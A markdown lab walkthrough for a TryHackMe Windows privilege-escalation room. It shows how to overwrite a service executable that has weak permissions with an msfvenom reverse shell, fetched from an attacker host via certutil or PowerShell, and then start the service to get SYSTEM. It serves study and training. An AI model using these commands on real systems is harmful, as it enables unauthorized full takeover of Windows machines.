# LAB — Weak Service Executable (Insecure Service Binary Permissions)

> **Lab:** [TryHackMe — Windows 10 PrivEsc](https://tryhackme.com/room/windows10privesc)
> **Goal:** Replace a service binary that has weak file permissions → get `NT AUTHORITY\SYSTEM`

---

## Concept

- The misconfiguration is on the **service executable file** itself, not the service config
- If the `.exe` has **Write (W)**, **Modify (M)**, or **Full (F)** permissions for our user/group → we can **replace** it with a reverse shell
- When the service starts under **LocalSystem**, our payload runs as `NT AUTHORITY\SYSTEM`

## Step 1 — Service Enumeration

### List all running services

```cmd
sc query
```

### List service names, paths, and accounts (cleaner output)

```cmd
wmic service get name, startname, pathname
```

> [!TIP]
> **What to focus on when reviewing service paths:**
> - Services with binaries **outside** `C:\Windows\System32\` (e.g., in `Program Files`, `Temp`, `Users`)
> - Services that look like **custom/third-party** installs, not default Windows services
> - Services running as **LocalSystem**
> 
> **Ignore:** `System32` and admin-owned directories (standard users can't write there)

### Example interesting findings

```
filepermsvc    "C:\Program Files\File Permissions Service\filepermservice.exe"    LocalSystem
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe    LocalSystem
```

```cmd

```

```
SERVICE_NAME: filepermsvc

        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**Key fields to check:**

| Field                 | Why It Matters                                                     |
| --------------------- | ------------------------------------------------------------------ |
| `START_TYPE`          | `DEMAND_START` = manual; `AUTO_START` = starts at boot             |
| `BINARY_PATH_NAME`   | The executable we may be able to replace                           |
| `SERVICE_START_NAME`  | **LocalSystem** → we get `NT AUTHORITY\SYSTEM` if we exploit this |

## Step 4 — Manual Permission Check with `icacls`

```cmd
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
```

```
C:\Program Files\File Permissions Service\filepermservice.exe Everyone:(F)
                                                              NT AUTHORITY\SYSTEM:(F)
                                                              BUILTIN\Administrators:(F)
                                                              WIN-QBA94KB3IOF\Administrator:(F)
                                                              NT AUTHORITY\SYSTEM:(I)(F)
                                                              BUILTIN\Administrators:(I)(F)
                                                              BUILTIN\Users:(I)(RX)
```

### `icacls` Permission Reference

| Code  | Meaning                |
| ----- | ---------------------- |
| **F** | Full Access            |
| **M** | Modify Access          |
| **RX**| Read and Execute       |
| **R** | Read-only              |
| **W** | Write-only             |
| **D** | Delete                 |
| **N** | No Access              |
| **(I)** | Inherited from parent directory |

> [!IMPORTANT]
> We only care about **W**, **M**, or **F** for our user/group.
> Here `Everyone:(F)` means **any user** can replace this binary!

📖 Reference: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

## Step 5 — Exploitation

### Generate reverse shell payload

Go to https://www.revshells.com/ → msfvenom → **Windows Stageless Reverse TCP (x64)**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
```

### Start listener on Kali

```bash
rlwrap -cAr nc -lvnp 4444
```

### Transfer and overwrite the service binary

```bash
# Kali — serve payload
python3 -m http.server 8000
```

**Option A — Download directly to the service path:**

```cmd
certutil -f -urlcache http://<KALI_IP>:8000/reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

**Option B — Download then copy:**

```cmd
powershell iwr http://<KALI_IP>:8000/reverse.exe -o reverse.exe
copy reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

### Start/restart the service

```cmd
net start filepermsvc

:: If service is already running:
net stop filepermsvc
net start filepermsvc

:: Alternative commands:
sc start filepermsvc
sc stop filepermsvc
```

## Quick Reference — Weak Service Executable Attack Flow

```
1. sc qc <service>             → Check BINARY_PATH_NAME & SERVICE_START_NAME
2. icacls "<binary_path>"      → Look for W / M / F for your user/group
3. msfvenom ... -f exe -o ...  → Generate reverse shell payload
4. Replace the service binary  → certutil / copy / iwr
5. nc -lvnp <port>             → Start listener
6. net start <service>         → Trigger execution → NT AUTHORITY\SYSTEM
```
